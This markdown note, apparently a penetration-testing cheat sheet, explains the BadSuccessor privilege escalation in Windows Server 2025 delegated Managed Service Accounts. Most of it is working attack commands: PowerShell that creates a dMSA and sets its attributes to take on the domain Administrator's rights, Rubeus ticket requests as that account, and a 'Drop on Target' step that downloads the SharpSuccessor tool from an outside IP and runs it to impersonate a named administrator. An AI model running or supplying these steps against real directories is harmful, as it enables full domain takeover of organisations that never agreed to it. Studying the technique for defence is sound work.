# Delegated Managed Service Accounts

The dMSA is a new account type introduced in Windows Server 2025 to facilitate the migration of traditional service accounts to Managed Service Accounts. This process is as follows:

- An administrator creates a new dMSA object, which is intended to supersede the existing service account.
- The administrator then initiates the migration, which sets the dMSA msDS-ManagedAccountPrecededByLink attribute to reference the original service account.
- When the original service authenticates as the original service account, it triggers a Lightweight Directory Access Protocol (LDAP) modify request. This adds the machine account to the list of principals that are allowed to retrieve the dMSA password.
- In the final step, the administrator completes the migration, which disables the original service account. The service continues to operate seamlessly using the dMSA.
- Once a dMSA supersedes an existing account, any attempts to authenticate as that existing account using its password will be blocked. These authentication requests are redirected to the Local Security Authority (LSA) to authenticate using the dMSA. By then, the request has been granted all permissions that the original account had in the Active Directory, by the Key Distribution Center (KDC).

While dMSAs are intended to prevent credential harvesting, dMSAs also create a privilege escalation path that attackers can exploit through the BadSuccessor technique.

## dMSA Misuse

If an attacker or low-privileged user attempts to initiate the migration process for an existing service account, the operation will fail, because only administrative users can initiate migration. Instead of initiating the migration process, a potential attacker would create a dMSA and then change the same dMSA attributes that the valid migration process changes. This mimics a migration and has the same effect on the migrated account.

By default, only high-privileged users can create dMSAs under the default Managed Service Accounts container. However, other users can create dMSAs in other containers. This ultimately means that any domain user who has Create all child objects or msDS-DelegatedManagedServiceAccount permissions on an organizational unit (OU) could potentially compromise the entire domain.

The following steps detail how an attacker could simulate the migration:

- Set the msDS-ManagedAccountPrecededByLink attribute to contain the DN of the account the attacker wants to impersonate.
- Set msDS-DelegatedMSAState to 2, to indicate that the migration process is complete.

After changing these attributes and authenticating as the dMSA, the attacker obtains the full permissions of the superseded account.

Any user with sufficient permissions can execute this method in any AD environment managed by a Windows Server 2025 domain controller (DC).

### BadSuccessor

- Create a dMSA under the found OU.

```powershell
New-ADServiceAccount -Name "attacker_DMSA" \
-DNSHostName "DNSHostName" \
-CreateDelegatedServiceAccount \
-PrincipalsAllowedToRetrieveManagedPassword "ComputerName$" \
-Path "OU=DelagatedOU,DC=env20,DC=local"
```

- Next, the attacker changes the attributes of the dMSA object to simulate the migration process. We demonstrated this in our test environment by setting the following values: 
	- msDS-ManagedAccountPrecededByLink attribute to contain the DN of the superceded account.
	- msDS-DelegatedMSAState to 2, to indicate that the migration process is complete.

```
$dMSA=[ADSI]"LDAP://CN=attacker_dMSA,OU=DelegatedOU,DC=env20,DC=local"
$dMSA.Put("msDS-DelegatedMSAState",2)
$dMSA.Put("msDS-ManagedAccountPrecededByLink","CN=Administrator,CN=Users,DC=env20,DC=local")
$dMSA.SetInfo()
```

### Follow On Attacks

After successfully executing the BadSuccessor technique, potential attackers can further exploit the domain using Rubeus, which [supports dMSA authentication](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory#title-8738ec3891). Figure 10 illustrates some Rubeus commands using the attacker_dMSA object in our test environment to gain access to privileged services in the domain.

```cmd
Rubeus.exe tgtdeleg /nowrap

Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/env20.local /opsec /dmsa /nowrap /ptt /ticket:<ticket>

Rubeus.exe asktgs /user:attacker_dMSA$ /service:cifs/ComputerName.env20.local /opsec /dmsa /nowrap /ptt /ticket:<ticket>
```

### Automating the Attack

#### SharpSuccessor

##### Drop on Target

```powershell
iwr -uri http://10.200.20.52/binaries/SharpSuccessor.exe -UseBasicParsing -OutFile SharpSuccessor.exe
```

##### Run
```powershell
.\SharpSuccessor.exe add /impersonate:Odin /path:"CN=ODIN,OU=ADMINISTRATORS,OU=YGGDRASIL USERS,DC=YGGDRASIL,DC=HACKSMARTER" /account:hodr /name:svc_iis_dMSA
```


